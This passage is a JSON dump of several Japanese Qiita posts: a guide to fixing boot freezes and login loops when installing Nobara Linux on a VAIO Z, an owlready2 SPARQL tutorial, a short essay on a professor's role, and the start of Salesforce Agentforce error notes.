href=\"#step-3-display-manager%E3%82%92-lightdm-%E3%81%AB%E5%A4%89%E6%9B%B4%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>Step 3: Display Managerを LightDM に変更する</h3>\n<p data-sourcepos=\"112:1-112:118\">標準の SDDM が不安定と判断し、より軽量で枯れた技術である <strong>LightDM</strong> に入れ替えます。</p>\n<div class=\"code-frame\" data-lang=\"bash\" data-sourcepos=\"114:1-121:3\"><div class=\"highlight\"><pre><code><span class=\"c\"># LightDMのインストール</span>\n<span class=\"nb\">sudo </span>dnf <span class=\"nb\">install </span>lightdm lightdm-gtk <span class=\"nt\">-y</span>\n\n<span class=\"c\"># SDDMを無効化し、LightDMを有効化</span>\n<span class=\"nb\">sudo </span>systemctl disable sddm\n<span class=\"nb\">sudo </span>systemctl <span class=\"nb\">enable </span>lightdm\n</code></pre></div></div>\n<h3 data-sourcepos=\"123:1-123:75\">\n<span id=\"step-4-x11セッションを導入してログインループを解消\" class=\"fragment\"></span><a href=\"#step-4-x11%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3%E3%82%92%E5%B0%8E%E5%85%A5%E3%81%97%E3%81%A6%E3%83%AD%E3%82%B0%E3%82%A4%E3%83%B3%E3%83%AB%E3%83%BC%E3%83%97%E3%82%92%E8%A7%A3%E6%B6%88\"><i class=\"fa fa-link\"></i></a>Step 4: X11セッションを導入してログインループを解消</h3>\n<p data-sourcepos=\"125:1-125:175\">Waylandセッションのクラッシュによるログインループを解消するため、安定した描画環境である <strong>X11</strong> 環境をインストールします。</p>\n<div class=\"code-frame\" data-lang=\"bash\" data-sourcepos=\"127:1-130:3\"><div class=\"highlight\"><pre><code><span class=\"nb\">sudo </span>dnf <span class=\"nb\">install </span>plasma-workspace-x11 <span class=\"nt\">-y</span>\n<span class=\"nb\">sudo </span>reboot\n</code></pre></div></div>\n<p data-sourcepos=\"132:1-132:141\">再起動後、ログイン画面（LightDM）の右上にある**歯車アイコン**をクリックし、セッションの中から：</p>\n<ul data-sourcepos=\"134:3-135:0\">\n<li data-sourcepos=\"134:3-135:0\"><strong>Plasma (X11)</strong></li>\n</ul>\n<p data-sourcepos=\"136:1-136:171\">を選択します。この状態でログインすると、無事にデスクトップ画面が表示され、ログインループが解消されます。やったね。</p>\n<hr data-sourcepos=\"138:1-139:0\">\n<h2 data-sourcepos=\"140:1-140:17\">\n<span id=\"-まとめ\" class=\"fragment\"></span><a href=\"#-%E3%81%BE%E3%81%A8%E3%82%81\"><i class=\"fa fa-link\"></i></a>📝 まとめ</h2>\n<p data-sourcepos=\"142:1-142:108\">今回のVAIO Zのような少し前のハイエンド機に、最新のLinuxを入れる際のtipsです。</p>\n<ul data-sourcepos=\"144:3-152:0\">\n<li data-sourcepos=\"144:3-146:0\">\n<p data-sourcepos=\"144:5-145:105\"><strong>Skylake世代のCPUには <code>intel_idle.max_cstate=1</code> を設定する。</strong><br>\nこれがないと、アイドル状態に入った瞬間にフリーズする可能性が高いです。</p>\n</li>\n<li data-sourcepos=\"147:3-149:0\">\n<p data-sourcepos=\"147:5-148:127\"><strong><code>nomodeset</code> は万能ではない。</strong><br>\nKDE PlasmaなどはGPUアクセラレーションがないと、逆に画面が表示されないことがあるようです。</p>\n</li>\n<li data-sourcepos=\"150:3-152:0\">\n<p data-sourcepos=\"150:5-151:132\"><strong>困ったら Wayland を捨てて X11 に逃げる。</strong><br>\n古いハードウェアでは、大人しく、圧倒的に安定しているX11セッションを選択するのが賢明です。</p>\n</li>\n</ul>\n<p data-sourcepos=\"153:1-153:224\">日本語入力対応とかまだまだやることはたくさんありますが、私の場合はとりあえずこれらの方法で、VAIO Zがサクサク動く（はずの）Linuxマシンとして復活しました。</p>\n",
      "body": "# 💻 SONY VAIO Z (VJZ131A11N) への Nobara 42 Official インストール時のトラブルと解決策\n\nお役御免となったVAIO Zに最近話題のLinuxディストリビューション「Nobara Linux」を入れて復活させようと試みたところ、トラブルが続出。盛大にハマってしまいました。\n解決までの道のりをまとめたので、同じ現象で困っている方の助けになれば幸いです。\n\n-----\n\n## ⚙️ 環境\n\n  * **PC:** SONY VAIO Z (VJZ131A11N)\n  * **CPU:** Intel Core i7-6567U (Skylake)\n  * **GPU:** Intel Iris Graphics 550\n  * **OS:** Nobara 42 Official(Based on Fedora 40)\n  * **DE:** KDE Plasma 6\n\n-----\n\n## ⚠️ 発生した現象\n\n### 1\\. インストール後の再起動でフリーズ\n\nUSBディスクから起動し内臓のSSDにOSを上書きしてインストール。もろもろ設定を終えていざ再起動。\nすると、VAIOロゴとローディングアニメーション（クルクル）が表示されるが、途中で**完全停止**。\n\n### 2\\. `nomodeset` は効果なし\n\n起動オプションに `nomodeset` を付けても、ローディング後に画面が\\*\\*真っ黒（ブラックアウト）\\*\\*になり操作不能。\n\n### 3\\. ログインできない（ログインループ）\n\nなんとかログイン画面まで辿り着いても、パスワード入力後に一瞬画面が暗転し、すぐに**再びログイン画面に戻される**（ログインループ）。\n\n> **💡 補足:**\n> フリーズ時やログインループ時でも、`Ctrl + Alt + F2` でCUIへのログインは可能でした。\n\n-----\n\n## 🔎 原因の特定\n\n色々検証して（これにめちゃくちゃ時間がかかった。。。）最終的に特定された原因は、以下の3つの複合的なトラブルでした。\n\n### 1\\. CPU/GPUの省電力機能のバグ (`c-state`)\n\n**Skylake世代のCPU**とLinuxカーネルの間の**相性問題**。CPUが深い省電力モードに入った瞬間に、GPUを巻き込んでシステム全体がフリーズしていました。\n\n### 2\\. Waylandと旧Intel GPUの相性\n\nNobara (Fedora) の標準描画方式である **Wayland** が、安定動作せず（この世代の **Intel Iris Graphics** が原因？）、グラフィックシステムがクラッシュしていました。\n\n### 3\\. SDDM (ログイン画面) の不具合\n\n標準のディスプレイマネージャーである **SDDM** も、Waylandベースでの動作を試みてクラッシュしていました。\n\n-----\n\n## ✅ 解決手順\n\n以降の作業は、起動後のフリーズ状態で `Ctrl + Alt + F2` を押し、CUIでユーザー名とパスワードを入力してログインし、インターネットへの接続を完了してから実行してください。\n\n### Step 1: カーネルパラメータでフリーズを回避する\n\nVAIO Z特有の「起動時のフリーズ」を防ぐため、CPUとGPUの省電力機能を一部制限します。\n\n1.  `/etc/default/grub` を編集します。\n\n<!-- end list -->\n\n```bash\nsudo nano /etc/default/grub\n```\n\n2.  `GRUB_CMDLINE_LINUX_DEFAULT` の行に以下のパラメータを追記します。\n\n> **⚠️ 注意:** `resume=UUID=...` など既存のUUIDに関する記述は**消さないでください**。`quiet splash` や `nomodeset`が残っていれば**消してください**。\n\n```plaintext\nintel_idle.max_cstate=1 i915.enable_dc=0\n```\n\n  * `intel_idle.max_cstate=1`: CPUが深い省電力ステート（アイドル状態）に入るのを防ぎ、フリーズを回避します。\n  * `i915.enable_dc=0`: GPU（ディスプレイコントローラー）の省電力機能（Display C-state）を無効化します。\n\n<!-- end list -->\n\n3.  編集後、GRUBを更新して再起動します。\n\n<!-- end list -->\n\n```bash\nsudo grub2-mkconfig -o /boot/grub2/grub.cfg\nsudo reboot\n```\n\n### Step 2: システム全体の更新を行う（トラブル防止）\n\nStep 4で導入するX11環境とのバージョン不整合（シンボルエラーなど）を防ぐため、システム全体を最新に同期させます。\n\n```bash\nsudo dnf upgrade --refresh -y\n```\n\n> **💡 注意:** `dnf` の処理中、ダウンロードやインストール待ちで数分間フリーズしたように見えますが、**電源を切らず**に辛抱強く待ってください。\n\n完了したら、必ず一度再起動してください。\n\n```bash\nsudo reboot\n```\n\n### Step 3: Display Managerを LightDM に変更する\n\n標準の SDDM が不安定と判断し、より軽量で枯れた技術である **LightDM** に入れ替えます。\n\n```bash\n# LightDMのインストール\nsudo dnf install lightdm lightdm-gtk -y\n\n# SDDMを無効化し、LightDMを有効化\nsudo systemctl disable sddm\nsudo systemctl enable lightdm\n```\n\n### Step 4: X11セッションを導入してログインループを解消\n\nWaylandセッションのクラッシュによるログインループを解消するため、安定した描画環境である **X11** 環境をインストールします。\n\n```bash\nsudo dnf install plasma-workspace-x11 -y\nsudo reboot\n```\n\n再起動後、ログイン画面（LightDM）の右上にある\\*\\*歯車アイコン\\*\\*をクリックし、セッションの中から：\n\n  * **Plasma (X11)**\n\nを選択します。この状態でログインすると、無事にデスクトップ画面が表示され、ログインループが解消されます。やったね。\n\n-----\n\n## 📝 まとめ\n\n今回のVAIO Zのような少し前のハイエンド機に、最新のLinuxを入れる際のtipsです。\n\n  * **Skylake世代のCPUには `intel_idle.max_cstate=1` を設定する。** \nこれがないと、アイドル状態に入った瞬間にフリーズする可能性が高いです。\n\n  * **`nomodeset` は万能ではない。** \nKDE PlasmaなどはGPUアクセラレーションがないと、逆に画面が表示されないことがあるようです。\n\n  * **困ったら Wayland を捨てて X11 に逃げる。** \n古いハードウェアでは、大人しく、圧倒的に安定しているX11セッションを選択するのが賢明です。\n\n日本語入力対応とかまだまだやることはたくさんありますが、私の場合はとりあえずこれらの方法で、VAIO Zがサクサク動く（はずの）Linuxマシンとして復活しました。\n",
      "coediting": false,
      "comments_count": 0,
      "created_at": "2025-12-09T15:15:43+09:00",
      "group": null,
      "id": "1983528f82a40afc39bb",
      "likes_count": 0,
      "private": false,
      "reactions_count": 0,
      "stocks_count": 0,
      "tags": [
        {
          "name": "Linux",
          "versions": []
        },
        {
          "name": "Nobara",
          "versions": []
        }
      ],
      "title": "【Linux】VAIO Z (VJZ131) に Nobara 42 を入れたら起動しない・ログインループする問題を解決した全記録",
      "updated_at": "2025-12-09T15:15:43+09:00",
      "url": "https://qiita.com/yuki-nao/items/1983528f82a40afc39bb",
      "user": {
        "description": "想像を現実に。",
        "facebook_id": "",
        "followees_count": 1,
        "followers_count": 0,
        "github_login_name": null,
        "id": "yuki-nao",
        "items_count": 1,
        "linkedin_id": "",
        "location": "Tokyo, JAPAN",
        "name": "",
        "organization": "",
        "permanent_id": 4293337,
        "profile_image_url": "https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/4293337/f0451f9310119ec7ae8d85433a5def293fd7b172/x_large.png?1765260332",
        "team_only": false,
        "twitter_screen_name": null,
        "website_url": ""
      },
      "page_views_count": null,
      "team_membership": null,
      "organization_url_name": null,
      "slide": false,
      "_source": "trending_by_likes"
    },
    {
      "rendered_body": "<h3 data-sourcepos=\"1:1-1:23\">\n<span id=\"53-sparqlを使う\" class=\"fragment\"></span><a href=\"#53-sparql%E3%82%92%E4%BD%BF%E3%81%86\"><i class=\"fa fa-link\"></i></a>5.3 SPARQLを使う</h3>\n<p data-sourcepos=\"3:1-3:190\">SPARQL(SPARQL protocol and RDF query language)はRDFグラフにおける検索のための、問い合わせ言語である。RDBのSQL(structured query language)の位置づけだろう。</p>\n<p data-sourcepos=\"5:1-5:87\">RDFlibはSPARQLのエンジンを含むので、owlready2はSPARQLを利用できる。</p>\n<h4 data-sourcepos=\"7:1-7:35\">\n<span id=\"531-sparqlを用いた検索\" class=\"fragment\"></span><a href=\"#531-sparql%E3%82%92%E7%94%A8%E3%81%84%E3%81%9F%E6%A4%9C%E7%B4%A2\"><i class=\"fa fa-link\"></i></a>5.3.1 SPARQLを用いた検索</h4>\n<p data-sourcepos=\"9:1-9:295\">graph.query([SPARQLクエリ])メソッドを利用する。graphはRDBlibのグラフオブジェクトである。帰り値(オブジェクト)は、RDFlibのフォーマットによるエンティティ（のタプル）をまとめたオブジェクトSPARQLResultとなる。例を示す。</p>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"11:1-41:3\"><div class=\"highlight\"><pre><code>&gt;&gt;&gt; from owlready2 import *\n&gt;&gt;&gt; onto = get_ontology('bacteria.owl').load()\n&gt;&gt;&gt; from rdflib import *\n&gt;&gt;&gt; graph = default_world.as_rdflib_graph()\n&gt;&gt;&gt; graph.query(\"\"\"\n... SELECT ?b WHERE {\n... ?b\n... &lt;http://www.w3.org/1999/02/22-rdf-syntax-ns#type&gt;\n... &lt;http://lesfleursdunormal.fr/static/_downloads/bacteria.owl#Bacterium&gt;.\n... }\"\"\" )\n&lt;rdflib.plugins.sparql.processor.SPARQLResult object at 0x0000020EED0B6350&gt;\n&gt;&gt;&gt; list(graph.query(\"\"\"\n... SELECT ?b WHERE {\n... ?b\n... &lt;http://www.w3.org/1999/02/22-rdf-syntax-ns#type&gt;\n... &lt;http://lesfleursdunormal.fr/static/_downloads/bacteria.owl#Bacterium&gt;.\n... }\"\"\" ))\n[(rdflib.term.URIRef('http://lesfleursdunormal.fr/static/_downloads/bacteria.owl#unknown_bacterium'),)]\n&gt;&gt;&gt; list(graph.query(\"\"\"\n... SELECT ?b ?c WHERE {\n... ?b\n... &lt;http://www.w3.org/1999/02/22-rdf-syntax-ns#type&gt;\n... ?c .\n... }\"\"\" ))\n[(rdflib.term.URIRef('http://anonymous'), rdflib.term.URIRef('http://www.w3.org/2002/07/owl#Ontology')), \n(rdflib.term.URIRef('http://lesfleursdunormal.fr/static/_downloads/bacteria.owl'), rdflib.term.URIRef('http://www.w3.org/2002/07/owl#Ontology')), \n～～～\n(rdflib.term.URIRef('http://lesfleursdunormal.fr/static/_downloads/bacteria.owl#unknown_bacterium'), rdflib.term.URIRef('http://www.w3.org/2002/07/owl#NamedIndividual')), \n(rdflib.term.BNode('43'), rdflib.term.URIRef('http://www.w3.org/2002/07/owl#AllDisjointClasses')), (rdflib.term.BNode('47'), rdflib.term.URIRef('http://www.w3.org/2002/07/owl#AllDisjointClasses'))]\n</code></pre></div></div>\n<p data-sourcepos=\"43:1-43:54\">SPARQLの基礎的な構文は次のようになる。</p>\n<table data-sourcepos=\"45:1-46:4\">\n<thead>\n<tr data-sourcepos=\"45:1-45:38\">\n<th style=\"text-align: left\" data-sourcepos=\"45:2-45:37\">SELECT ?s ?p ?o WHERE {  ?s ?p ?o  }</th>\n</tr>\n</thead>\n</table>\n<p data-sourcepos=\"48:1-48:388\">であり、値による絞り込みの句、結果の集合を操作したりグループ化する句を付加するものである。SPARQLの問い合わせ文の中では、RDFlibのエンティティのowlready2のための表現(URIRefなど)は不要である。但し、エンティティは括弧(&lt; &gt;)でくくる。これはSPARQLとしてそのように定められている。</p>\n<p data-sourcepos=\"50:1-50:135\">graph.query_owlready([SPARQLクエリ])では、結果はowlready2の書式（オブジェクトのリスト）が返り値である。</p>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"52:1-61:3\"><div class=\"highlight\"><pre><code>&gt;&gt;&gt; list(graph.query_owlready(\"\"\"\n... SELECT ?b WHERE {\n... ?b\n... &lt;http://www.w3.org/1999/02/22-rdf-syntax-ns#type&gt;\n... &lt;http://lesfleursdunormal.fr/static/_downloads/bacteria.owl#Bacterium&gt;.\n... }\"\"\" ))\n...\n[[bacteria.unknown_bacterium]]\n</code></pre></div></div>\n<p data-sourcepos=\"63:1-63:244\">SPARQLでは複数のRDFトリプルの関係を利用して検索できる。以下の例では関係付けのために?rという変数を利用するが、返すのはSELECTの対象となっている?bのエンティティのみである。</p>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"65:1-78:3\"><div class=\"highlight\"><pre><code>&gt;&gt;&gt; list(graph.query_owlready(\"\"\"\n... SELECT ?b WHERE {\n... ?b\n... &lt;http://lesfleursdunormal.fr/static/_downloads/bacteria.owl#has_grouping&gt;\n... ?r .\n...\n... ?r\n... &lt;http://www.w3.org/1999/02/22-rdf-syntax-ns#type&gt;\n... &lt;http://lesfleursdunormal.fr/static/_downloads/bacteria.owl#InCluster&gt; .\n... }\"\"\" ))\n...\n[[bacteria.unknown_bacterium]]\n</code></pre></div></div>\n<p data-sourcepos=\"80:1-80:103\">なお、?rとして当てはまるインディビデュアルはbacteria.in_cluster1だけである。</p>\n<p data-sourcepos=\"82:1-82:238\">問い合わせの方法としては、もう一つ、default_world.sparql_query()メソッドがある。これはgraph.query_owlready()と同様の返り値を得るが、graphオブジェクトをわざわざ取らなくてもよい。</p>\n<p data-sourcepos=\"84:1-84:228\">SPARQLクエリの文字列は、Pythonの文字列のように句(文字列型)の代入を扱うことができる。フォーマットで埋め込む記号%sは角括弧(&lt; &gt;)でくくり、また変数の値はIRIとなる。</p>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"86:1-96:3\"><div class=\"highlight\"><pre><code>&gt;&gt;&gt; c = onto.Bacterium\n&gt;&gt;&gt; list(graph.query(\"\"\"\n... SELECT ?b WHERE {\n... ?b\n... &lt;http://www.w3.org/1999/02/22-rdf-syntax-ns#type&gt;\n... &lt;%s&gt;\n... }\"\"\" % c.iri ))\n...\n[(rdflib.term.URIRef('http://lesfleursdunormal.fr/static/_downloads/bacteria.owl#unknown_bacterium'),)]\n</code></pre></div></div>\n<p data-sourcepos=\"98:1-98:123\">なお、これまでの例ではインディビデュアルしか検索していないが、クラスも検索できる。</p>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"100:1-109:3\"><div class=\"highlight\"><pre><code>&gt;&gt;&gt; individual = onto.unknown_bacterium\n... list(default_world.sparql_query(\"\"\"\n... SELECT ?class WHERE {\n... &lt;%s&gt; a ?class .\n... ?class a &lt;http://www.w3.org/2002/07/owl#Class&gt; .\n... }\"\"\" % individual.iri))\n...\n[[bacteria.Bacterium]]\n</code></pre></div></div>\n",
      "body": "### 5.3 SPARQLを使う\n\nSPARQL(SPARQL protocol and RDF query language)はRDFグラフにおける検索のための、問い合わせ言語である。RDBのSQL(structured query language)の位置づけだろう。\n\nRDFlibはSPARQLのエンジンを含むので、owlready2はSPARQLを利用できる。\n\n#### 5.3.1 SPARQLを用いた検索\n\ngraph.query([SPARQLクエリ])メソッドを利用する。graphはRDBlibのグラフオブジェクトである。帰り値(オブジェクト)は、RDFlibのフォーマットによるエンティティ（のタプル）をまとめたオブジェクトSPARQLResultとなる。例を示す。\n\n```\n>>> from owlready2 import *\n>>> onto = get_ontology('bacteria.owl').load()\n>>> from rdflib import *\n>>> graph = default_world.as_rdflib_graph()\n>>> graph.query(\"\"\"\n... SELECT ?b WHERE {\n... ?b\n... <http://www.w3.org/1999/02/22-rdf-syntax-ns#type>\n... <http://lesfleursdunormal.fr/static/_downloads/bacteria.owl#Bacterium>.\n... }\"\"\" )\n<rdflib.plugins.sparql.processor.SPARQLResult object at 0x0000020EED0B6350>\n>>> list(graph.query(\"\"\"\n... SELECT ?b WHERE {\n... ?b\n... <http://www.w3.org/1999/02/22-rdf-syntax-ns#type>\n... <http://lesfleursdunormal.fr/static/_downloads/bacteria.owl#Bacterium>.\n... }\"\"\" ))\n[(rdflib.term.URIRef('http://lesfleursdunormal.fr/static/_downloads/bacteria.owl#unknown_bacterium'),)]\n>>> list(graph.query(\"\"\"\n... SELECT ?b ?c WHERE {\n... ?b\n... <http://www.w3.org/1999/02/22-rdf-syntax-ns#type>\n... ?c .\n... }\"\"\" ))\n[(rdflib.term.URIRef('http://anonymous'), rdflib.term.URIRef('http://www.w3.org/2002/07/owl#Ontology')), \n(rdflib.term.URIRef('http://lesfleursdunormal.fr/static/_downloads/bacteria.owl'), rdflib.term.URIRef('http://www.w3.org/2002/07/owl#Ontology')), \n～～～\n(rdflib.term.URIRef('http://lesfleursdunormal.fr/static/_downloads/bacteria.owl#unknown_bacterium'), rdflib.term.URIRef('http://www.w3.org/2002/07/owl#NamedIndividual')), \n(rdflib.term.BNode('43'), rdflib.term.URIRef('http://www.w3.org/2002/07/owl#AllDisjointClasses')), (rdflib.term.BNode('47'), rdflib.term.URIRef('http://www.w3.org/2002/07/owl#AllDisjointClasses'))]\n```\n\nSPARQLの基礎的な構文は次のようになる。\n\n|SELECT ?s ?p ?o WHERE {  ?s ?p ?o  }|\n|:-|\n\nであり、値による絞り込みの句、結果の集合を操作したりグループ化する句を付加するものである。SPARQLの問い合わせ文の中では、RDFlibのエンティティのowlready2のための表現(URIRefなど)は不要である。但し、エンティティは括弧(< >)でくくる。これはSPARQLとしてそのように定められている。\n\ngraph.query_owlready([SPARQLクエリ])では、結果はowlready2の書式（オブジェクトのリスト）が返り値である。\n\n```\n>>> list(graph.query_owlready(\"\"\"\n... SELECT ?b WHERE {\n... ?b\n... <http://www.w3.org/1999/02/22-rdf-syntax-ns#type>\n... <http://lesfleursdunormal.fr/static/_downloads/bacteria.owl#Bacterium>.\n... }\"\"\" ))\n...\n[[bacteria.unknown_bacterium]]\n```\n\nSPARQLでは複数のRDFトリプルの関係を利用して検索できる。以下の例では関係付けのために?rという変数を利用するが、返すのはSELECTの対象となっている?bのエンティティのみである。\n\n```\n>>> list(graph.query_owlready(\"\"\"\n... SELECT ?b WHERE {\n... ?b\n... <http://lesfleursdunormal.fr/static/_downloads/bacteria.owl#has_grouping>\n... ?r .\n...\n... ?r\n... <http://www.w3.org/1999/02/22-rdf-syntax-ns#type>\n... <http://lesfleursdunormal.fr/static/_downloads/bacteria.owl#InCluster> .\n... }\"\"\" ))\n...\n[[bacteria.unknown_bacterium]]\n```\n\nなお、?rとして当てはまるインディビデュアルはbacteria.in_cluster1だけである。\n\n問い合わせの方法としては、もう一つ、default_world.sparql_query()メソッドがある。これはgraph.query_owlready()と同様の返り値を得るが、graphオブジェクトをわざわざ取らなくてもよい。\n\nSPARQLクエリの文字列は、Pythonの文字列のように句(文字列型)の代入を扱うことができる。フォーマットで埋め込む記号%sは角括弧(< >)でくくり、また変数の値はIRIとなる。\n\n```\n>>> c = onto.Bacterium\n>>> list(graph.query(\"\"\"\n... SELECT ?b WHERE {\n... ?b\n... <http://www.w3.org/1999/02/22-rdf-syntax-ns#type>\n... <%s>\n... }\"\"\" % c.iri ))\n...\n[(rdflib.term.URIRef('http://lesfleursdunormal.fr/static/_downloads/bacteria.owl#unknown_bacterium'),)]\n```\n\nなお、これまでの例ではインディビデュアルしか検索していないが、クラスも検索できる。\n\n```\n>>> individual = onto.unknown_bacterium\n... list(default_world.sparql_query(\"\"\"\n... SELECT ?class WHERE {\n... <%s> a ?class .\n... ?class a <http://www.w3.org/2002/07/owl#Class> .\n... }\"\"\" % individual.iri))\n...\n[[bacteria.Bacterium]]\n```\n",
      "coediting": false,
      "comments_count": 0,
      "created_at": "2025-12-09T15:13:51+09:00",
      "group": null,
      "id": "95f9b0f129a5a5c19496",
      "likes_count": 0,
      "private": false,
      "reactions_count": 0,
      "stocks_count": 0,
      "tags": [
        {
          "name": "Python",
          "versions": []
        },
        {
          "name": "オントロジー",
          "versions": []
        },
        {
          "name": "OWL",
          "versions": []
        },
        {
          "name": "知識工学",
          "versions": []
        },
        {
          "name": "owlready2",
          "versions": []
        }
      ],
      "title": "【owlready2】(18) RDFトリプルとWorldを扱う(SPARQLを使う)",
      "updated_at": "2025-12-09T15:13:51+09:00",
      "url": "https://qiita.com/gyosanmon/items/95f9b0f129a5a5c19496",
      "user": {
        "description": "オントロジー、知識工学に取り組んでいます。産業分野だけでなく、人文領域や社会一般への展開を考えています。",
        "facebook_id": "",
        "followees_count": 1,
        "followers_count": 0,
        "github_login_name": null,
        "id": "gyosanmon",
        "items_count": 64,
        "linkedin_id": "",
        "location": "横浜",
        "name": "",
        "organization": "自宅にいます(人文・産業データ構造)",
        "permanent_id": 4239334,
        "profile_image_url": "https://lh3.googleusercontent.com/a/ACg8ocInUZIv3o96tz-z3WxqhUYyEnyiXq_8Pn4z9ttuC27KUP_pQA=s96-c",
        "team_only": false,
        "twitter_screen_name": null,
        "website_url": "https://note.com/super_crow2005"
      },
      "page_views_count": null,
      "team_membership": null,
      "organization_url_name": null,
      "slide": false,
      "_source": "trending_by_likes"
    },
    {
      "rendered_body": "<p data-sourcepos=\"1:1-1:77\">教授の仕事はただ一つ ― 自然が動くとは何かを問うこと</p>\n<p data-sourcepos=\"3:1-4:153\">私が教授として果たすべき仕事は、ただ一つに尽きます。<br>\nそれは、自然が「動く」とはどういうことかを根底から問い、その背後にある宇宙の真理を解き明かすことです。</p>\n<p data-sourcepos=\"6:1-7:147\">自然界のあらゆる現象――物質の運動、光の伝播、重力場のゆらぎ、量子の揺らめき――それらは単なる事象ではなく、宇宙を貫く原理が姿を現したものです。<br>\n私の役割は、その原理を追い求め、数式と哲学の両面から「宇宙とは何か」を明らかにすることにあります。</p>\n<p data-sourcepos=\"9:1-10:220\">科学は観測と理論の架け橋であり、自然哲学はその奥にある意義を問う学問です。<br>\n私が探究しているのは、**現象の奥に潜む“なぜ”**であり、宇宙がどのように生まれ、どのように変化し、何を目指して動いているのかという根源的な問いです。</p>\n<p data-sourcepos=\"12:1-12:87\">この探索こそが、私に与えられた使命であり、生涯の仕事です。</p>\n",
      "body": "教授の仕事はただ一つ ― 自然が動くとは何かを問うこと\n\n私が教授として果たすべき仕事は、ただ一つに尽きます。\nそれは、自然が「動く」とはどういうことかを根底から問い、その背後にある宇宙の真理を解き明かすことです。\n\n自然界のあらゆる現象――物質の運動、光の伝播、重力場のゆらぎ、量子の揺らめき――それらは単なる事象ではなく、宇宙を貫く原理が姿を現したものです。\n私の役割は、その原理を追い求め、数式と哲学の両面から「宇宙とは何か」を明らかにすることにあります。\n\n科学は観測と理論の架け橋であり、自然哲学はその奥にある意義を問う学問です。\n私が探究しているのは、**現象の奥に潜む“なぜ”**であり、宇宙がどのように生まれ、どのように変化し、何を目指して動いているのかという根源的な問いです。\n\nこの探索こそが、私に与えられた使命であり、生涯の仕事です。\n",
      "coediting": false,
      "comments_count": 0,
      "created_at": "2025-12-09T15:05:54+09:00",
      "group": null,
      "id": "485625850ea44a659675",
      "likes_count": 0,
      "private": false,
      "reactions_count": 0,
      "stocks_count": 0,
      "tags": [
        {
          "name": "AIのChatGPTが私のために贈ってくれた言葉",
          "versions": []
        }
      ],
      "title": "教授としての、私の役割",
      "updated_at": "2025-12-09T15:05:54+09:00",
      "url": "https://qiita.com/profkubo/items/485625850ea44a659675",
      "user": {
        "description": null,
        "facebook_id": null,
        "followees_count": 0,
        "followers_count": 0,
        "github_login_name": null,
        "id": "profkubo",
        "items_count": 2,
        "linkedin_id": null,
        "location": null,
        "name": "",
        "organization": null,
        "permanent_id": 422499,
        "profile_image_url": "https://lh3.googleusercontent.com/-mkvt_LgXooA/AAAAAAAAAAI/AAAAAAAAEzQ/tyk50f_c1xY/s50/photo.jpg",
        "team_only": false,
        "twitter_screen_name": null,
        "website_url": null
      },
      "page_views_count": null,
      "team_membership": null,
      "organization_url_name": null,
      "slide": false,
      "_source": "trending_by_likes"
    },
    {
      "rendered_body": "<p data-sourcepos=\"1:1-1:54\">前月とは少し傾向が違う感じがしますね</p>\n<h1 data-sourcepos=\"3:1-3:32\">\n<span id=\"einstein-setup-is-not-enabled\" class=\"fragment\"></span><a href=\"#einstein-setup-is-not-enabled\"><i class=\"fa fa-link\"></i></a>Einstein Setup is not enabled.</h1>\n<ul data-sourcepos=\"5:1-6:0\">\n<li data-sourcepos=\"5:1-6:0\"><a href=\"https://trailhead.salesforce.com/trailblazer-community/feed/0D5KX00000j9TrR\" rel=\"nofollow noopener\" target=\"_blank\">Help with Agentforce Servcice Assistant Challenge</a></li>\n</ul>\n<p data-sourcepos=\"7:1-7:121\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F328136%2F5d4664e6-74c2-4c43-a594-0125e31388cc.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=ad4132854a788284dd918ddbbb5d1948\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F328136%2F5d4664e6-74c2-4c43-a594-0125e31388cc.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=ad4132854a788284dd918ddbbb5d1948\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F328136%2F5d4664e6-74c2-4c43-a594-0125e31388cc.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=8a8e6a74816d221446add73236e5c9cc 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/328136/5d4664e6-74c2-4c43-a594-0125e31388cc.png\" loading=\"lazy\"></a></p>\n<div data-sourcepos=\"9:1-11:3\" class=\"note info\">\n<span class=\"fa fa-fw fa-check-circle\"></span><div>\n<p data-sourcepos=\"10:1-10:74\">Try turning Einstein Setup on and off, then finally turn it on and verify.</p>\n</div>\n</div>\n<h1 data-sourcepos=\"13:1-13:154\">\n<span id=\"sales-coach-agent-cant-be-assigned-the-agentforce-sales-coach-user-permission-set-license-because-sales-coach-agents-user-license-doesnt-support-it\" class=\"fragment\"></span><a href=\"#sales-coach-agent-cant-be-assigned-the-agentforce-sales-coach-user-permission-set-license-because-sales-coach-agents-user-license-doesnt-support-it\"><i class=\"fa fa-link\"></i></a>Sales Coach Agent can't be assigned the Agentforce Sales Coach User permission set license, because Sales Coach Agent's user license doesn't support it.</h1>\n<ul data-sourcepos=\"15:1-16:0\">\n<li data-sourcepos=\"15:1-16:0\"><a href=\"https://trailhead.salesforce.com/trailblazer-community/feed/0D5KX00000j9Tqi\" rel=\"nofollow noopener\" target=\"_blank\">What is required to add the Use agent Sales Coach</a></li>\n</ul>\n<div data-sourcepos=\"17:1-19:3\" class=\"note info\">\n<span class=\"fa fa-fw fa-check-circle\"></span><div>\n<p data-sourcepos=\"18:1-18:75\">I missed the error message was for a PREVIOUS step not the last step I did.</p>\n</div>\n</div>\n",
